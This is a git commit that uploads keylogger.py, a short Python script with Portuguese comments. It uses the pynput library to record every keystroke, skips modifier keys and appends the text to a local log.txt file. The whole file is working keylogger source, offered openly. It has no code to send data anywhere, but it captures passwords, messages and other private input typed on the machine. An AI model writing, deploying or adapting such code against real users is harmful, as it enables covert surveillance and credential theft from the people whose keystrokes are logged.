8e2a8f853c63155f6b202d3597b3a6dd11c57739
andre hiraga <150747401+icemaveriki@users.noreply.github.com>
2025-11-30 20:04:12 -0300

    Add files via upload

---
+++ keylogger.py
@@ -0,0 +1,36 @@
+from pynput import keyboard
+
+ignorar = {keyboard.Key.shift, 
+           keyboard.Key.shift_r,
+           keyboard.Key.ctrl_l,
+           keyboard.Key.ctrl_r,
+           keyboard.Key.alt_l,
+           keyboard.Key.alt_r,
+           keyboard.Key.caps_lock,
+           keyboard.Key.tab,
+           keyboard.Key.cmd,
+           keyboard.Key.cmd_r}
+
+def on_press(key):
+    try:
+        #se for uma tecla "normal "(letra,numero,simbolo)
+        with open("log.txt", "a", encoding="utf-8") as f:    
+            f.write(key.char)
+    except AttributeError:
+        with open("log.txt", "a", encoding="utf-8") as f:
+            if key == keyboard.Key.space:
+                f.write(" ")
+            elif key == keyboard.Key.enter:
+                f.write("\n")
+            elif key == keyboard.Key.tab:
+                f.write("\t")
+            elif key == keyboard.Key.backspace:
+                f.write("")
+            elif key == keyboard.Key.esc:
+                f.write("[ESC]")
+            elif key in ignorar:
+                pass    
+            else:
+                f.write(f"[{key}]")
+with keyboard.Listener(on_press=on_press) as listener:
+    listener.join() 
